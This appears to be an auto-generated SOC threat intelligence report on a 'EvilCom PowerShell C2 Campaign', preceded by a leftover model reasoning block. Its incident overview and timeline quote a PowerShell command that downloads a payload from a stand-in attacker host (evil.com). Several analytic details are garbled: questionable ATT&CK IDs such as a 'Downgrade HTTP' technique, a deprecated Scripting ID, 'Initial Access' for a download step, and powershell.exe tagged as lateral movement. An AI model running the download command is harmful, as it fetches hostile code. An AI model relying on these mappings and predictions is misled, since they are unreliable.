# Threat Intelligence Report

**Campaign:** EvilCom PowerShell C2 Campaign
**Campaign ID:** CAMPAIGN-2025-07-03-1
**Generated:** 2026-07-06T10:17:51.381110+00:00

---

<think>
Okay, let's start by understanding the user's request. They want a professional SOC threat intelligence report in Markdown format based on the provided data. The report needs to include 12 specific sections, each with particular content. The user emphasized conciseness, technical accuracy, and using tables where appropriate. Also, they mentioned not to invent evidence and to base conclusions strictly on the given information.

First, I'll go through each section one by one. The Executive Summary should be a brief overview. The Incident Overview needs key facts only. The Timeline is a table with timestamps and events. The Attack Chain should outline the steps in the attack. MITRE ATT&CK Mapping requires a table with techniques and confidence. Vulnerability Analysis is a table, but since there are no vulnerabilities, I'll note that. Indicators of Compromise (IOCs) are in a table with verdicts. Campaign Assessment is a summary of the campaign. Risk Assessment includes impact and likelihood ratings. Predicted Next Steps are in a table with techniques and confidence. Response Recommendations should be actionable. Confidence Assessment is the overall confidence level.

Looking at the provided data, the main event is a PowerShell command downloading a malicious payload. The IOCs include a suspicious IP, a malicious URL, and a suspicious process. The MITRE ATT&CK technique is T1059.001. The campaign is named "EvilCom PowerShell C2 Campaign" with high confidence. Predictions suggest next steps like T1562.010, T1689, and T1064. No vulnerabilities were found.

I need to structure each section with the given data. For the Timeline, the event is at 2025-07-03T10:00:00Z. The Attack Chain would be the steps leading to the download. The MITRE table includes the technique ID, name, confidence, and reason. The IOCs table lists each IOC with their details. The Campaign Assessment is based on the provided summary. Risk Assessment should have impact and likelihood as medium. Predicted Next Steps are the techniques with their confidence levels. Response Recommendations should include steps like isolating the host, checking logs, updating defenses, etc. Confidence Assessment is high based on the campaign's confidence.

I need to ensure that all sections are filled accurately without adding any extra information. Since there are no vulnerabilities, the Vulnerability Analysis section will state that. Also, all tables must be correctly formatted in Markdown. I'll check that each section adheres to the user's specifications and that the total word count is under 500 words. Finally, verify that all data from the user's input is correctly represented without any invented details.
</think>

# Threat Intelligence Incident Report  

## Executive Summary  
An administrator account on `target-node2` executed a PowerShell command to download a malicious payload from a known C2 domain (`evil.com`). The activity aligns with ATT&CK technique T1059.001 (PowerShell for command execution) and involves multiple high-confidence IOCs.  

---

## Incident Overview  
- **Host**: `target-node2`  
- **User**: `Administrator`  
- **Process**: `powershell.exe`  
- **Command**: `Invoke-WebRequest http://evil.com/payload.exe`  
- **Source IP**: `185.220.101.45` (suspicious)  
- **Destination IP**: `192.168.1.28` (benign)  

---

## Timeline  
| Timestamp           | Event Type         | Description                                                                 |  
|----------------------|--------------------|-----------------------------------------------------------------------------|  
| 2025-07-03T10:00:00Z | Network Connection | PowerShell executed `Invoke-WebRequest` to download `http://evil.com/payload.exe`. |  

---

## Attack Chain  
1. **Initial Access**: PowerShell used to download payload from `evil.com`.  
2. **Command & Control**: Payload likely establishes C2 communication via `185.220.101.45`.  

---

## MITRE ATT&CK Mapping  
| Technique ID       | Technique Name | Confidence | Reason                                                                 |  
|---------------------|----------------|------------|------------------------------------------------------------------------|  
| T1059.001           | PowerShell    | 91%        | PowerShell executed `Invoke-WebRequest` to download malicious payload. |  

---

## Vulnerability Analysis  
**No vulnerabilities identified.**  

---

## Indicators of Compromise  
| IOC Value            | Type         | Verdict     | Category           | Confidence | Justification                                                                 |  
|----------------------|--------------|-------------|--------------------|------------|-------------------------------------------------------------------------------|  
| 185.220.101.45       | IP Address   | Suspicious  | C2                 | 70%        | Public IP associated with potential C2 activity.                              |  
| 192.168.1.28         | IP Address   | Benign      | Internal Network   | 100%       | Private IPv4 address within reserved range.                                   |  
| http://evil.com/payload.exe | URL      | Malicious   | Malware Distribution | 95%        | Known malicious domain and executable filename.                               |  
| powershell.exe       | Process Name | Suspicious  | Lateral Movement   | 60%        | Commonly abused for post-exploitation.                                        |  
| evil.com             | Domain       | Malicious   | Malware Distribution | 98%        | Associated with known malicious infrastructure.                               |  
| payload.exe          | File Path    | Suspicious  | Malware            | 75%        | Commonly used in malware delivery chains.                                    |  

---

## Campaign Assessment  
**Campaign ID**: `CAMPAIGN-2025-07-03-1`  
**Name**: `EvilCom PowerShell C2 Campaign`  
**Summary**: Single-event campaign where an admin account used PowerShell to download a malicious payload from a known C2 domain (`evil.com`). High confidence due to multiple malicious IOCs and ATT&CK alignment.  

---

## Risk Assessment  
| Impact | Likelihood |  
|--------|------------|  
| Medium | Medium     |  

---

## Predicted Next Steps  
| Technique ID       | Technique Name           | Confidence |  
|---------------------|--------------------------|------------|  
| T1562.010           | Downgrade TLS            | 85%        |  
| T1689                 | Downgrade HTTP           | 82%        |  
| T1064                 | Scripting                | 78%        |  

---

## Response Recommendations  
1. **Isolate** `target-node2` from the network.  
2. **Investigate** PowerShell logs for additional malicious commands.  
3. **Block** `evil.com` and `185.220.101.45` at the firewall.  
4. **Review** admin account activity for unauthorized access.  
5. **Enable** script block logging for PowerShell.  

---

## Confidence Assessment  
**Overall Confidence**: High (93%)  
**Rationale**: Strong alignment with ATT&CK patterns and multiple high-confidence IOCs.